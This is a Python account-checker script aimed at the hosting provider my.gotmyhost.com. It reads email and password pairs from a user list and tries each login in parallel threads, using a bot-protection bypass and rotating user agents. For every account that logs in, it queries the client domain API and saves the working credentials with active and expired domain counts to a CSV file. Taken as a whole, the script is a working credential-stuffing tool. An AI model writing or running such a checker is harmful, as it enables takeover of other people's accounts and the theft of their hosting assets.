from cloudscraper import create_scraper
from curl_cffi.requests import get, post
import re,csv,json
from mahdix import W_ueragnt

def save_csv(data, filename):
    with open(filename, 'a', newline='', encoding='utf-8') as csvfile:
        writer = csv.writer(csvfile)
        if csvfile.tell() == 0:  # Check if the file is empty
            writer.writerow(['email','password','Active Domain', 'Expire Domain'])
        writer.writerow([data['email'], data['password'], data['Active Domain'], data['Expire Domain']])
headersx = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://srhostbd.com',
    'Referer': 'https://srhostbd.com/index.php/login',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

def get_domain_data(email, password):
    try:
        scraper = create_scraper()
        # scraper.proxies.update( proxies)
        headers=headersx.copy()
        headers['User-Agent']= W_ueragnt()
        gwt_data = scraper.get("https://my.gotmyhost.com/login'", headers=headers)
        # open("gwt_data.txt", "w", encoding="utf-8").write(gwt_data.text)
        token = re.search(r"csrfToken = '(.*?)'", gwt_data.text).group(1)
        data = {
            'token': token,
            'username': email,
            'password': password,
        }
        response = scraper.post('https://my.gotmyhost.com/login', headers=headers, data=data)
        # open("response.txt", "w", encoding="utf-8").write(response.text)
        # params = {
        #     'action': 'domains',
        # }
        # response = scraper.get('https://my.gotmyhost.com/clientarea.php', params=params, cookies=scraper.cookies.get_dict(), headers=headers)
        # _doamin = re.findall(r'<span class="badge float-right">(.*?)</span>', response.text)
        # print(_doamin)


        params = {
            'controller': 'ClientData',
            'method': 'getClientDomains',
            'draw': '3',
            'columns[0][data]': '',
            'columns[0][name]': '',
            'columns[0][searchable]': 'true',
            'columns[0][orderable]': 'false',
            'columns[0][search][value]': '',
            'columns[0][search][regex]': 'false',
            'columns[1][data]': '',
            'columns[1][name]': 'domain',
            'columns[1][searchable]': 'true',
            'columns[1][orderable]': 'true',
            'columns[1][search][value]': '',
            'columns[1][search][regex]': 'false',
            'columns[2][data]': '',
            'columns[2][name]': 'nextduedate',
            'columns[2][searchable]': 'true',
            'columns[2][orderable]': 'true',
            'columns[2][search][value]': '',
            'columns[2][search][regex]': 'false',
            'columns[3][data]': '',
            'columns[3][name]': 'donotrenew',
            'columns[3][searchable]': 'true',
            'columns[3][orderable]': 'true',
            'columns[3][search][value]': '',
            'columns[3][search][regex]': 'false',
            'columns[4][data]': '',
            'columns[4][name]': 'status',
            'columns[4][searchable]': 'true',
            'columns[4][orderable]': 'true',
            'columns[4][search][value]': '',
            'columns[4][search][regex]': 'false',
            'columns[5][data]': '',
            'columns[5][name]': 'actions',
            'columns[5][searchable]': 'true',
            'columns[5][orderable]': 'false',
            'columns[5][search][value]': '',
            'columns[5][search][regex]': 'false',
            'order[0][column]': '1',
            'order[0][dir]': 'asc',
            'start': '0',
            'length': '10',
            'search[value]': '',
            'search[regex]': 'true',
            '_': '1783715474194',
        }

        response = scraper.get(
            'https://my.gotmyhost.com/modules/addons/RSThemes/src/Api/clientApi.php',
            params=params,
            cookies=scraper.cookies.get_dict(),
            headers=headers,
        ).json()
        recordsTotal=response['recordsTotal']
       
        expired_count = sum(1 for item in response['data'] if item['status']['status'] == 'Expired')
        print(f"Email: {email}, Password: {password}, Active Domain: {recordsTotal-expired_count}, Expire Domain: {expired_count}")
        # open("response.txt", "w", encoding="utf-8").write(response.text)
        save_csv({
            'email': data['username'],
            'password': data['password'],
            'Active Domain': recordsTotal-expired_count,
            'Expire Domain': expired_count
        }, 'domain_data.csv')
    except Exception as e:
        print(f"Error occurred for {email}: {e}")
with open('mygotmyhostcom_users.txt', 'r', encoding='utf-8') as f:
        reads_file = f.read().splitlines()

from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=5) as sub:
    for i,u in enumerate(reads_file) :
        try:
            username = u.split('|')[0]
            password = u.split('|')[1]
            # get_domain_data(username, password)
            sub.submit(get_domain_data,username, password)
        except Exception as e:
            print(f"Error occurred for line {i+1}: {e}")

